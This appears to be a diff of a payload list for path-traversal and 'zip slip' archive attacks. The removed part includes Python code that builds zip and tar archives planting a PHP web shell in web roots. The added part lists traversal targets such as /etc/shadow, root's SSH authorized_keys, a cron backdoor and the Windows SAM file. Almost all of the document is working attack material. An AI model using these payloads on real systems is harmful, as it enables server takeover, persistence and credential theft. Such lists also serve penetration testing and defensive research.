@@ -1,28 +1,10 @@
-../shell.php
-../../shell.php
-../../../shell.php
-../../../../shell.php
-../../../var/www/html/shell.php
-../../../srv/http/shell.php
-../../../usr/local/apache2/htdocs/shell.php
-..\..\shell.php
-..\..\..\inetpub\wwwroot\shell.php
-
-import zipfile
-
-with zipfile.ZipFile("zipslip.zip", "w") as z:
-    z.write("shell.php", arcname="../../../var/www/html/shell.php")
-
-import tarfile, os
-
-with tarfile.open("tarslip.tar.gz", "w:gz") as t:
-    info = tarfile.TarInfo(name="../../../var/www/html/shell.php")
-    info.size = len(b"<?php system($_GET['c']); ?>")
-    import io
-    t.addfile(info, io.BytesIO(b"<?php system($_GET['c']); ?>"))
-
-../../../var/www/html/shell.php
-../../../root/.ssh/authorized_keys
+../../../../etc/passwd (inside zip)
+../../../../etc/shadow
+../../../../var/www/html/shell.php
+../../../../root/.ssh/authorized_keys
 ../../../etc/cron.d/backdoor
-../../../home/user/.bashrc
-../../../usr/local/bin/command
+../../../../windows/system32/config/sam
+../../../usr/local/bin/backdoor
+../../../../tmp/shell.sh
+../../app/config/database.yml
+../web/WEB-INF/web.xml
